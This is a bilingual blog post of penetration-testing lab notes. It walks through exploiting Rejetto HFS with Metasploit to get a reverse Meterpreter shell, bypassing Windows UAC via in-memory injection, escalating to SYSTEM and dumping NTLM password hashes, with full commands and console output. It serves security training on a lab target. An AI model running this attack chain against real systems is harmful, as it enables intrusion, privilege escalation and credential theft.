---
layout: post
title: "Windows Privilege Escalation Bypassing UAC"
date: "2023-02-15"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Windows Privilege Escalation: Bypassing UAC
## Bypassing UAC
User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

UAC is used to ensure that changes to the operating system require approval from the administrator.

We can utilize the "Windows Escalate UAC Protection Bypass (In Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.

# Windows 权限提升：绕过 UAC
## 绕过 UAC
用户帐户控制 (UAC) 是 Windows Vista 中引入的一项 Windows 安全功能，用于防止对操作系统进行未经授权的更改。

UAC 用于确保对操作系统的更改需要管理员的批准。

我们可以利用“Windows Escalate UAC Protection Bypass (In Memory Injection)”模块通过进程注入利用受信任的发布者证书来绕过UAC。 它将生成第二个关闭 UAC 标志的 shell。

# Demo: Windows Privilege Escalation: Bypassing UAC（演示：Windows 权限提升：绕过 UAC）
Whenever you try and perform any action that requires administrative privileges, sort of like opening a Windows command prompt as administrator or installing a new program, you will be prompted with the UAC prompt that asks you whether or not you want to allow a certain application to make changes to this particular device. And then you can either say Yes or No. Now, if you are a standard user and not an administrator, once you hit Yes, you need to provide the administrator password in order to allow a certain application to make changes to your operating system or to that particular device.

If you don't have the administrator password or if you're not the administrator, then you can't make any changes.

What this exploit module will do is it will bypass UAC. And it will then consequently spawn or create a second Meterpreter session, in our case, that has UAC turned off, which means within the second Meterpreter session, we will not have UAC enabled at all. Which means we can perform administrative tasks or we can perform what the administrator would be able to perform without providing the administrative password. And in this case, consequently, elevate our privileges. 

In order to perform this, you're going to need to have access to the target system via a Meterpreter session or a Meterpreter shell. And in addition to that, you also must ensure that the Meterpreter session or the Meterpreter payload being used is the 64-bit version as opposed to the 32-bit version.

Target IP Address: 10.2.29.131

Start up the PostgreSQL database service.

```
service postgresql start && msfconsole
```

Create a new workspace.

```
workspace -a UACBypass
```

Set up the global variable for the RHOSTS option.

```
setg RHOSTS 10.2.29.131
```

We now need to perform an Nmap scan on the target server to identify what services are running on it, and consequently, exploit one of the services in order to gain access to the target system, so that we can get a Meterpreter session, after which we can take a look at how to elevate our privileges.

We'll use the `db_nmap` command to perform an Nmap scan from within the MSF console. And this command will allow us to consequently save the Nmap scan results directly into the MSF database. And we can then access the results whenever we want.

`-sV`: We're going to perform some service version detection.

```
db_nmap -sV 10.2.29.131
```

```
search rejetto
use exploit/windows/http/rejetto_hfs_exec
```

We then need to set the payload to the 64-bit Meterpreter payload because this is what will be required in order to successfully bypass UAC or to elevate our privileges.

```
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST eth1
run
```

`getuid`: What user we currently have access to by typing in Get User ID.

```
meterpreter > sysinfo
meterpreter > getuid
Server username: VICTIM\admin
```

And in this case, we have an account called Admin, not Administrator.

Now, we can try and elevate our privileges using the `getsystem` command.

```
meterpreter > getsystem
```

All of the techniques fail.

Let's try and get an understanding as to what users are currently on the system and what our privileges are.

`getprivs`: This command is limited to the Meterpreter session on a Windows target. This will give you an idea of your current privileges or the privileges assigned to this particular user.

```
meterpreter > getpriv
```

And indeed, we can confirm that this really isn't an Admin user, but just a standard user.

Now, this Admin user may be part of the Administrators group.

So how exactly can we verify that or find out whether or not this user is part of the Administrators group?

In order to do that, we can open up a shell session to get a command prompt.

```
meterpreter > shell
```

We can start off by displaying the users on the system.

```
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net users
```

We have an Admin account, which is what we currently have access to. And then we have the real Administrator account, as well as a Guest account.

In order to enumerate the members that are part of the Administrators group.

```
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
```

The members of Administrators group are Admin and Administrator.

So the Admin user account is part of Administrators group, which means they can perform administrative tasks or they can make changes to the operating system, which means we can bypass UAC relatively easily.

Why are we utilizing this particular privilege escalation technique?

The reason we're utilizing the Bypass User Access Control technique is because first and foremost, it exists within versions of Windows from Windows Vista to the latest versions of Windows. So it is fairly stable in that regard. And secondly, it is a very efficient technique when it comes down to elevating privileges and doesn't require any additional tinkering or tweaking.

And the MSF has various Bypass UAC modules available based on your currently situation or the configuration of the target system.

Now that we've verified that the Admin user is part of the Administrators group, we already know that we don't have administrative privileges through the Meterpreter session.

We can bypass UAC by utilizing the Bypass UAC module. But to be specific, we're look for the In Memory Injection module.

Terminate this particular channel.

```
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>^C
```

Put this in the background.

```
meterpreter > background
```

And if we check our sessions, you can see that this is a Meterpreter 64-bit Meterpreter session. And we currently have access to the system via the Admin user.

```
sessions
```

The one we are interested in, in particular is going to be the Bypass UAC Injection module, which performs the bypassing of the User Access Control mechanism in memory. And in this case, it will execute the Meterpreter payload in memory.

[Windows Escalate UAC Protection Bypass (In Memory Injection)](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_injection/)

This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.

Windows 升级 UAC 保护绕过（内存注入）

该模块将通过进程注入利用受信任的发布者证书来绕过 Windows UAC。它将生成第二个关闭 UAC 标志的 shell。该模块使用反射 DLL 注入技术仅丢弃 DLL 负载二进制文件，而不是标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于 SYSWOW64 系统也使用 x64）。如果指定 EXE::Custom，您的 DLL 应该在单独的进程中启动有效负载后调用 ExitProcess()。

It's going to set the default payload to the 32-bit Meterpreter payload. So we need to change that to the Windows x64 payload.

```
search bypassuac
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
show options
set SESSION 1
```

We then need to set up the LPORT option, because if we list out our sessions here, this particular session is already utilizing port 4444.

```
sessions
set LPORT 4433
run
```

In order to set the target, we're going to say `set TARGET`, and then we can use the Tab Alt to completion. We can use this to set the target operating system architecture. So in this case, we need to set the target to Windows x64. 

```
set TARGET Windows\ x64
run
```

```
meterpreter > sysinfo
meterpreter > getuid
Server username: VICTIM\admin
```

The reason we don't have any elevated privileges is primarily because the Bypass UAC exploit module created a second Meterpreter session. And this Meterpreter session has the UAC flag or UAC disabled, which means we can utilize `getsystem` command to elevate our privileges. And in this case, it will successfully be able to elevate our privileges because UAC is disabled. And as a result, we can pretty much execute any command as the Administrator user without providing any passwords or any credentials.

```
meterpreter > getsystem
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

And the reason why I recommend utilizing this particular technique and this particular exploit module is because it works really well on Windows versions newer than Windows Vista. Windows Server 2008, Windows Server 2012, Windows 7, Windows 10, Windows 8.1, etc.

We've now been able to elevate our privileges. We can perform tasks that require administrative privileges like `hashdump`.

```
meterpreter > hashdump
```

You can now go ahead and perform all the tasks or functionality that require administrative privileges.

That is how to elevate your privileges by bypassing UAC.

# UAC Bypass: Memory Injection (Metasploit)（UAC绕过：内存注入（Metasploit））
## Overview（概述）
A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, bypass [UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) using the Memory Injection Metasploit local exploit module. 

Objective: Gain the highest privilege on the compromised machine and get administrator user NTLM hash.

Instructions:
* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
* The IP address of the target machine is mentioned in the file “/root/Desktop/target”
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

为您提供了 Kali GUI 机器和运行易受攻击服务器的目标机器。目标机器的 IP 地址在位于 Kali 机器桌面 (/root/Desktop/target) 上的名为 target 的文本文件中提供。 

您的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，并使用适当的 Metasploit 模块利用该应用程序。

然后， 使用内存注入Metasploit绕过[UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)本地漏洞利用模块。 

目标：在受感染机器上获得最高权限并获得管理员用户 NTLM 哈希。

指示：
* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口运行“ip addr”来知道 X 和 Y 的值。
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关

## Solutions（解决方案）
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-2210.pdf

## 复现视频中的内容
Target IP Address : 10.0.22.98

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 13 database server: main.
msf6 > workspace -a UACBypass
[*] Added workspace: UACBypass
[*] Workspace: UACBypass
msf6 > setg RHOSTS 10.0.22.98
RHOSTS => 10.0.22.98
msf6 > db_nmap -sV 10.0.22.98
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-15 08:24 IST
[*] Nmap: Nmap scan report for 10.0.22.98
[*] Nmap: Host is up (0.0037s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 66.90 seconds
msf6 > services
Services
========

host        port   proto  name               state  info
----        ----   -----  ----               -----  ----
10.0.22.98  80     tcp    http               open   HttpFileServer httpd 2.3
10.0.22.98  135    tcp    msrpc              open   Microsoft Windows RPC
10.0.22.98  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.0.22.98  445    tcp    microsoft-ds       open   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
10.0.22.98  3389   tcp    ssl/ms-wbt-server  open   
10.0.22.98  49152  tcp    msrpc              open   Microsoft Windows RPC
10.0.22.98  49153  tcp    msrpc              open   Microsoft Windows RPC
10.0.22.98  49154  tcp    msrpc              open   Microsoft Windows RPC
10.0.22.98  49155  tcp    msrpc              open   Microsoft Windows RPC

```

```
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.0.22.98       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Using URL: http://0.0.0.0:8080/mQmnUcX2qBZKX7A
[*] Local IP: http://10.10.16.4:8080/mQmnUcX2qBZKX7A
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /mQmnUcX2qBZKX7A
[*] Sending stage (200262 bytes) to 10.0.22.98
[*] Meterpreter session 1 opened (10.10.16.4:4444 -> 10.0.22.98:49244) at 2023-02-15 08:32:36 +0530
[!] Tried to delete %TEMP%\qkBIzyh.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getsystem
[-] 2001: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```

```
meterpreter > shell
Process 460 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net users
net users

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.
```

```
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>^C
Terminate channel 2? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...
```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x64/windows  VICTIM\admin @ VICTIM  10.10.16.4:4444 -> 10.0.22.98:49244 (10.0.22.98)
```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > search bypassuac

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   1   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   2   exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
   3   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   4   exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   5   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   6   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   7   exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   8   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   9   exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
   10  exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
   11  exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
   12  exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry


Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/local/bypassuac_windows_store_reg
```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/bypassuac_injection
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_injection) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_injection) > show options

Module options (exploit/windows/local/bypassuac_injection):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac_injection) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x64/windows  VICTIM\admin @ VICTIM  10.10.16.4:4444 -> 10.0.22.98:49244 (10.0.22.98)

msf6 exploit(windows/local/bypassuac_injection) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/bypassuac_injection) > set LPORT 4433
LPORT => 4433

```

```
msf6 exploit(windows/local/bypassuac_injection) > run

[*] Started reverse TCP handler on 10.10.16.4:4433 
[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[-] Exploit aborted due to failure: bad-config: x86 Target Selected for x64 System
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/bypassuac_injection) > set TARGET 
set TARGET 0             set TARGET 1             set TARGET Windows\ x64  set TARGET Windows\ x86  
msf6 exploit(windows/local/bypassuac_injection) > set TARGET Windows\ x64
TARGET => Windows x64
msf6 exploit(windows/local/bypassuac_injection) > run

[*] Started reverse TCP handler on 10.10.16.4:4433 
[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 2540
[*] Sending stage (200262 bytes) to 10.0.22.98
[*] Meterpreter session 2 opened (10.10.16.4:4433 -> 10.0.22.98:49318) at 2023-02-15 08:53:20 +0530

meterpreter > 

```

```
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/bypassuac_injection) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x64/windows  VICTIM\admin @ VICTIM  10.10.16.4:4444 -> 10.0.22.98:49244 (10.0.22.98)
  2         meterpreter x64/windows  VICTIM\admin @ VICTIM  10.10.16.4:4433 -> 10.0.22.98:49318 (10.0.22.98)

msf6 exploit(windows/local/bypassuac_injection) > sessions 2
[*] Starting interaction with 2...

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/bypassuac_injection) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  VICTIM\admin @ VICTIM         10.10.16.4:4444 -> 10.0.22.98:49244 (10.0.22.98)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VICTIM  10.10.16.4:4433 -> 10.0.22.98:49318 (10.0.22.98)
```

```
msf6 exploit(windows/local/bypassuac_injection) > sessions 2
[*] Starting interaction with 2...

meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f168d9f8e6c5b893b8c4dfa202228235:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
